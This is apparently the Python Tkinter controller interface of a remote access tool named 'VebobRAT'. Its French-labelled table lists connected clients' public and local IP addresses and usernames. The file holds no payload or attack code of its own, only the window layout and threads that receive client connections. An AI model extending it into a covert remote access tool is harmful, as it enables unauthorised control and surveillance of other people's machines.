from server.board_updating import Updater
from tkinter import *

from server.receiver import Receiver

board_canvas = Canvas()
selected_row = 0

def on_connection_selection(event, selected_row):
    label = event.widget
    label_row = label.grid_info().get("row")
    if selected_row == label_row:
        for i in range(4):
            board_canvas.grid_slaves(row=label_row, column=i)[0].configure(bg='#438BF6')
    else:
        for i in range(4):
            board_canvas.grid_slaves(row=selected_row, column=i)[0].configure(bg='#BD7713')
            board_canvas.grid_slaves(row=label_row, column=i)[0].configure(bg='#BD138C')
        selected_row = label_row
    pass

clients_list = []

receiver_thread = Receiver(clients_list)
receiver_thread.start()

window = Tk()
window.title("VebobRAT")
window.geometry("1080x720")
window.minsize(1080, 720)
window.maxsize(1080, 720)
window.iconbitmap("icon.ico")
window.config(background='#1665D9')

control_frame = Frame(window, bg='#1352AF', width=300, height=620, bd=3, relief=SUNKEN)
control_frame.place(x=730, y=50)

board_frame = Frame(window, bg='#1352AF', width=623, height=620, bd=3, relief=SUNKEN)
board_frame.place(x=50, y=50)

board_canvas = Canvas(board_frame, bg='#1352AF', width=595, height=610)
board_canvas.grid(row=0, column=0)
board_canvas.grid_propagate(0)
board_canvas.bind_class('Label', '<Button-1>', on_connection_selection)

public_IP_label = Label(board_canvas, text="Adresse IP publique", bd=3, relief=GROOVE, width=20, bg='#438BF6')
local_IP_label = Label(board_canvas, text="Adresse IP locale", bd=3, relief=GROOVE, width=20, bg='#438BF6')
username_label = Label(board_canvas, text="Nom d'utilisateur", bd=3, relief=GROOVE, width=20, bg='#438BF6')
network_username_label = Label(board_canvas, text="Nom d'utilisateur réseau", bd=3, relief=GROOVE, width=21,
                               bg='#438BF6')

public_IP_label.grid(row=0, column=0)
local_IP_label.grid(row=0, column=1)
username_label.grid(row=0, column=2)
network_username_label.grid(row=0, column=3)

vsb = Scrollbar(board_frame, orient="vertical", command=board_canvas.yview)
vsb.grid(row=0, column=5, sticky=NS)
board_canvas.configure(yscrollcommand=vsb.set)

board_updater_thread = Updater(clients_list, board_canvas)
board_updater_thread.start()

window.mainloop() # Peut bloquer l'exécution du programme principal (à mettre dans un Thread si pose problème).